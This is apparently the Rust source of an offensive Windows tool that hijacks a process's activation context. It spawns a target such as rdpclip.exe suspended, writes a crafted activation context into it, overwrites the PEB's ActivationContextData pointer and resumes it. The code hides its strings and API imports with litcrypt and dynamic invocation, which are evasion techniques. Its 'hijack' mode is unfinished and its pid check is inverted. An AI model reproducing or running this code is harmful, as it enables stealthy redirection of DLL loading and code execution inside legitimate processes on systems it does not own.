#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use std::{env, ffi::c_void, path::Path, ptr::{self, copy_nonoverlapping}};
use dinvoke_rs::data::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PVOID};
use getopts::Options;
use ntapi::ntpebteb::PEB;
use windows::{core::PCWSTR, Win32::{Foundation::HANDLE, Security::SECURITY_ATTRIBUTES, System::{ApplicationInstallationAndServicing::ACTCTXW, Diagnostics::ToolHelp::THREADENTRY32, Memory::MEMORY_BASIC_INFORMATION, Threading::{PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW}}}};

pub type GetModuleHandleW = unsafe extern "system" fn (*mut u16) -> isize;
pub type CreateActCtxW = unsafe extern "system" fn (*mut ACTCTXW) -> HANDLE;
pub type VirtualQuery = unsafe extern "system" fn (PVOID, *mut MEMORY_BASIC_INFORMATION, usize) -> usize;
pub type CreateProcessW = unsafe extern "system" fn (*const u16, *const u16, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, u32, *const c_void, *const u16, *const STARTUPINFOW, *mut PROCESS_INFORMATION) -> bool;
pub type ResumeThread = unsafe extern "system" fn (HANDLE) -> u32;

fn main() 
{
    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();
    let mut opts = Options::new();
    opts.reqopt("m", "mode", ".", "");
    opts.reqopt("b", "binary", ".", "");
    opts.optflag("h", "help", "Print this help menu.");
    opts.optopt("p", "manifest-path", "", "");
    opts.optopt("r", "resource-number", r"Path in which to write the log file [default: C:\Windows\Temp\result.log].", "");
    opts.optopt("i", "pid", r"Path in which to write the log file [default: C:\Windows\Temp\result.log].", "");

    let matches = match opts.parse(&args[1..]) 
    {
        Ok(m) => { m }
        Err(_) => {print_usage(&program, opts); return; }
    };

    if matches.opt_present("h") 
    {
        print_usage(&program, opts);
        return;
    }

    if !matches.opt_present("p") && !matches.opt_present("r")
    {
        print_usage(&program, opts);
        return;
    }

    let mode = matches.opt_str("m").unwrap();
    let binary_path = matches.opt_str("b").unwrap();
    let mut resource_index: u32 = 0;
    let mut manifest_path = String::new();
    let mut pid = 0u32;

    if matches.opt_present("r") {
        resource_index = matches.opt_str("r").unwrap().parse().unwrap();
    } else {
        manifest_path = matches.opt_str("p").unwrap();
    }

    if mode == "spawn".to_string() {
        spawn_new_process(binary_path, resource_index, manifest_path);
    } 
    else if mode == "hijack".to_string() 
    {
        if !matches.opt_present("i") {
            pid = matches.opt_str("i").unwrap().parse().unwrap();
        } else {
            print_usage(&program, opts);
            return;
        }

        hijack_process_or_thread(pid, resource_index, manifest_path);
    } 
    else {
        print_usage(&program, opts);
    }
}

fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: String) 
{
    unsafe 
    {
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        let mut embedded_manifest = true;
        let mut hmodule = 0isize;

        if resource_index != 0 
        {
            let function: GetModuleHandleW;
            let ret: Option<isize>;
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("GetModuleHandleW"),function,ret,ptr::null_mut());

            if ret.unwrap() != 0 {
                hmodule = ret.unwrap();
            } else {
                println!("{}", &lc!("[x] Call to GetModuleHandleW failed."));
                return;
            }

        } 
        else 
        {
            let path = Path::new(&manifest_path);
            if !path.exists() {
                println!("{}", &lc!("[x] Manifest file not found."));
                return;
            } 

            embedded_manifest = false;
        }

        let mut context = ACTCTXW::default();
        context.cbSize = size_of::<ACTCTXW>() as u32;
        let mut manifest: Vec<u16> = manifest_path.encode_utf16().collect();
        manifest.push(0);

        if embedded_manifest 
        {
            context.dwFlags = 0x80 | 0x8; // ACTCTX_FLAG_HMODULE_VALID | ACTCTX_FLAG_RESOURCE_NAME_VALID
            context.lpResourceName = PCWSTR(resource_index as usize as *mut _); // MAKEINTRESOURCEW(resource_index)
            context.hModule.0 = hmodule;
        }
        else {
            context.lpSource = PCWSTR(manifest.as_ptr());
        }

        let function: CreateActCtxW;
        let ret: Option<HANDLE>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateActCtxW"),function,ret,&mut context);

        let context_handle = ret.unwrap();
        if context_handle.0 == -1 {
            println!("{}", &lc!("[x] Failed to create Activation Context.")); // This usually means wrong resource index or incorrect manifest file contents
            return;
        }

        println!("{}", &lc!("[+] Activation Context created locally."));

        let handle_ptr = context_handle.0 as *mut usize;
        let ac_struct_ptr = handle_ptr.add(3);
        let ac_struct_addr = *ac_struct_ptr;

        let mut mbi = MEMORY_BASIC_INFORMATION::default();
        let function: VirtualQuery;
        let ret: Option<usize>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("VirtualQuery"),function,ret,ac_struct_addr as *mut _,&mut mbi,size_of::<MEMORY_BASIC_INFORMATION>());

        if ret.unwrap() == 0 {
            println!("{}", &lc!("[x] Call to VirtualQuery failed."));
            return;
        }

        let dwsize = mbi.RegionSize;
        let mut dst_buffer = vec![0u8;dwsize];
        let src = *ac_struct_ptr as *mut u8;
        let dst = dst_buffer.as_mut_ptr();
        copy_nonoverlapping(src, dst, dwsize);

        let mut application: Vec<u16> = binary_path.encode_utf16().collect();
        application.push(0);
        let mut startup_info: STARTUPINFOW =std::mem::zeroed() ;
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed() ;
        let function: CreateProcessW;
        let ret: Option<bool>;
        dinvoke_rs::dinvoke::dynamic_invoke!(
            k32,
            &lc!("CreateProcessW"),
            function,
            ret,
            ptr::null_mut(),
            application.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            false,
            0x00000004, // Suspended
            ptr::null_mut(),
            ptr::null(),
            &mut startup_info,
            &mut process_info
         );

        if !ret.unwrap() {
            println!("{}", &lc!("[x] New process spawn failed."));
            return;
        }

        println!("{}", &lc!("[+] New process spawned in suspended mode."));

        hijack_process(process_info.hProcess, process_info.hThread, dst, dwsize, true);
        /* // Get new process' PEB base address
        let pi = PROCESS_BASIC_INFORMATION::default();
        let process_information: *mut c_void = std::mem::transmute(&pi);
        let ret = dinvoke_rs::dinvoke::nt_query_information_process(
            process_info.hProcess, 
            0, 
            process_information,  
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            ptr::null_mut());
        
        if ret != 0 {
            println!("{}", &lc!("[x] Failed to obtain new process' PEB base address."));
            return;
        }

        println!("{}", &lc!("[+] Remote process PEB base address obtained."));

        let base_addr = usize::default();
        let base_address: *mut PVOID = std::mem::transmute(&base_addr);
        let zero_bits = 0 as usize;
        let size: *mut usize = std::mem::transmute(&dwsize);

        let ret = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(
            process_info.hProcess, 
            base_address, 
            zero_bits, 
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE);
        
        if ret != 0 {
            println!("{}", &lc!("[x] Failed to allocate memory in the new process."));
            return;
        }

        println!("{}", &lc!("[+] Memory successfully allocated in the new process."));

        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            process_info.hProcess, 
            *base_address, 
            dst as *mut _, 
            dwsize, 
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to write the activation context data struct to the remote process."));
            return;
        }

        println!("{}", &lc!("[+] Local Activation Context mapped in the remote process."));

        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(process_information);
        let field_offset = (*process_information_ptr).PebBaseAddress as usize + 0x2f8 as usize; // This is the offset of PEB->ActivationContextData
        let field_offset_ptr: PVOID = std::mem::transmute(field_offset);
        let value = *base_address as usize;
        let value_ptr: PVOID = std::mem::transmute(&value);
        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            process_info.hProcess, 
            field_offset_ptr, 
            value_ptr, 
            8, // Overwrite the field to make it point to the activation context data written before
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to patch the new process PEB."));
            return;
        }

        println!("{}", &lc!("[+] PEB successfully patched. Resuming process!"));

        let function: ResumeThread;
        let _ret: Option<u32>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("ResumeThread"),function,_ret,process_info.hThread); */

    }
}

fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: *mut u8, ac_struct_size: usize, resume_process: bool)
{
    unsafe 
    {
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));

        // Get process' PEB base address
        let pi = PROCESS_BASIC_INFORMATION::default();
        let process_information: *mut c_void = std::mem::transmute(&pi);
        let ret = dinvoke_rs::dinvoke::nt_query_information_process(
            process_handle, 
            0, 
            process_information,  
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            ptr::null_mut());
        
        if ret != 0 {
            println!("{}", &lc!("[x] Failed to obtain new process' PEB base address."));
            return;
        }

        println!("{}", &lc!("[+] Remote process PEB base address obtained."));

        let base_addr = usize::default();
        let base_address: *mut PVOID = std::mem::transmute(&base_addr);
        let zero_bits = 0 as usize;
        let size: *mut usize = std::mem::transmute(&ac_struct_size);

        let ret = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(
            process_handle, 
            base_address, 
            zero_bits, 
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE);
        
        if ret != 0 {
            println!("{}", &lc!("[x] Failed to allocate memory in the new process."));
            return;
        }

        println!("{}", &lc!("[+] Memory successfully allocated in the new process."));

        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            process_handle, 
            *base_address, 
            ac_struct_ptr as *mut _, 
            ac_struct_size, 
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to write the activation context data struct to the remote process."));
            return;
        }

        println!("{}", &lc!("[+] Local Activation Context mapped in the remote process."));

        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(process_information);
        let field_offset = (*process_information_ptr).PebBaseAddress as usize + 0x2f8 as usize; // This is the offset of PEB->ActivationContextData
        let field_offset_ptr: PVOID = std::mem::transmute(field_offset);
        let value = *base_address as usize;
        let value_ptr: PVOID = std::mem::transmute(&value);
        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            process_handle, 
            field_offset_ptr, 
            value_ptr, 
            8, // Overwrite the field to make it point to the activation context data written before
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to patch the new process PEB."));
            return;
        }

        println!("{}", &lc!("[+] PEB successfully patched. Resuming process!"));

        if resume_process 
        {
            let function: ResumeThread;
            let _ret: Option<u32>;
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("ResumeThread"),function,_ret,thread_handle);
        }
        
    }
}

fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String) 
{
    unsafe 
    {
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        let mut embedded_manifest = true;
        let mut hmodule = 0isize;

        if resource_index != 0 
        {
            let function: GetModuleHandleW;
            let ret: Option<isize>;
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("GetModuleHandleW"),function,ret,ptr::null_mut());

            if ret.unwrap() != 0 {
                hmodule = ret.unwrap();
            } else {
                println!("{}", &lc!("[x] Call to GetModuleHandleW failed."));
                return;
            }

        } 
        else 
        {
            let path = Path::new(&manifest_path);
            if !path.exists() {
                println!("{}", &lc!("[x] Manifest file not found."));
                return;
            } 

            embedded_manifest = false;
        }

        let mut context = ACTCTXW::default();
        context.cbSize = size_of::<ACTCTXW>() as u32;
        let mut manifest: Vec<u16> = manifest_path.encode_utf16().collect();
        manifest.push(0);

        if embedded_manifest 
        {
            context.dwFlags = 0x80 | 0x8; // ACTCTX_FLAG_HMODULE_VALID | ACTCTX_FLAG_RESOURCE_NAME_VALID
            context.lpResourceName = PCWSTR(resource_index as usize as *mut _); // MAKEINTRESOURCEW(resource_index)
            context.hModule.0 = hmodule;
        }
        else {
            context.lpSource = PCWSTR(manifest.as_ptr());
        }

        let function: CreateActCtxW;
        let ret: Option<HANDLE>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateActCtxW"),function,ret,&mut context);

        let context_handle = ret.unwrap();
        if context_handle.0 == -1 {
            println!("{}", &lc!("[x] Failed to create Activation Context.")); // This usually means wrong resource index or incorrect manifest file contents
            return;
        }

        println!("{}", &lc!("[+] Activation Context created locally."));

        let handle_ptr = context_handle.0 as *mut usize;
        let ac_struct_ptr = handle_ptr.add(3);
        let ac_struct_addr = *ac_struct_ptr;

        let mut mbi = MEMORY_BASIC_INFORMATION::default();
        let function: VirtualQuery;
        let ret: Option<usize>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("VirtualQuery"),function,ret,ac_struct_addr as *mut _,&mut mbi,size_of::<MEMORY_BASIC_INFORMATION>());

        if ret.unwrap() == 0 {
            println!("{}", &lc!("[x] Call to VirtualQuery failed."));
            return;
        }

        let dwsize = mbi.RegionSize;
        let mut dst_buffer = vec![0u8;dwsize];
        let src = *ac_struct_ptr as *mut u8;
        let dst = dst_buffer.as_mut_ptr();
        copy_nonoverlapping(src, dst, dwsize);

        let tid = get_main_thread_id(pid);
        if tid == 0 {
            
        }

    }
    
}

fn get_main_thread_id(pid: u32) -> u32
{
    unsafe
    {
        let func: dinvoke_rs::data::CreateToolhelp32Snapshot;
        let ret: Option<HANDLE>;
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateToolhelp32Snapshot"),func,ret,0x00000004,0); //TH32CS_SNAPTHREAD

        let snapshot = ret.unwrap();
        let mut te32: THREADENTRY32 = THREADENTRY32::default();
        te32.dwSize = size_of::<THREADENTRY32>() as u32;

        let f: dinvoke_rs::data::Thread32First;
        let r: Option<bool>;
        let te32_ptr: *mut THREADENTRY32 = std::mem::transmute(&te32);
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("Thread32First"),f,r,snapshot,te32_ptr);

        if !r.unwrap()
        {
            println!("{}",&lc!("[x] Call to Thread32First failed."));
            return 0;
        } 

        loop 
        {
            if te32.th32OwnerProcessID == pid {
                return te32.th32ThreadID;
            }

            let func: dinvoke_rs::data::Thread32Next;
            let ret: Option<bool>;
            let te32_ptr: *mut THREADENTRY32 = std::mem::transmute(&te32);
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("Thread32Next"),func,ret,snapshot,te32_ptr);
            if !ret.unwrap() {
                break;
            } 

        }
    }

    0

}

fn print_usage(program: &str, opts: Options) {
    let brief = format!(r"Usage: {} -m spawn|hijack -b C:\Windows\System32\rdpclip.exe -r 3 [options]", program);
    print!("{}", opts.usage(&brief));
}
